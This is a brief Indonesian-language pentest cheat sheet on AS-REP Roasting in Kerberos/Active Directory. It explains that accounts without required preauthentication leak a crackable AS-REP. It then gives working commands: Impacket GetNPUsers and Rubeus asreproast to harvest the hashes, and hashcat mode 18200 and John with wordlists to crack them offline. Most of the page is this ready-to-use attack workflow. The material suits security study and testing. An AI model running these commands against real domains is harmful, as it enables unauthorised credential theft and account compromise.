# AS-REP Roasting Attack (Kerberos 5)

AS-REP Roasting terjadi ketika Attacker mencoba untuk memperoleh Ticket Granting Ticket (TGT) ke Authentication Service (AS) untuk sebuah User tanpa perlu menggunakan kata sandi User tersebut. Hal ini terjadi karena User mengaktifkan konfigurasi `Do not require Kerberos preauthentication`.

![Do not require Kerberos preauthentication](https://github.com/xchopath/www.novr.one/assets/44427665/8c045741-dcff-4d81-b579-c935c720fba9)

Kemudian Attacker akan mendapatkan Credential berupa AS REP, setelah itu AS REP akan di-roast (crack) dengan metode seperti Brute Force (secara offline).

## 1. AS-REQ (client request is called AS-REQ).

### Impacket
```sh
impacket-GetNPUsers <domain>/<user> -dc-ip <ip domain controller> -request
```

### Rubeus
```
Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
```

## 2. Roast the AS-REP

### Hashcat

```sh
hashcat -m 18200 -a 0 <as_rep file> <passwords list>
```

### John

```sh
john --wordlist=<passwords list> <as_rep file>
```
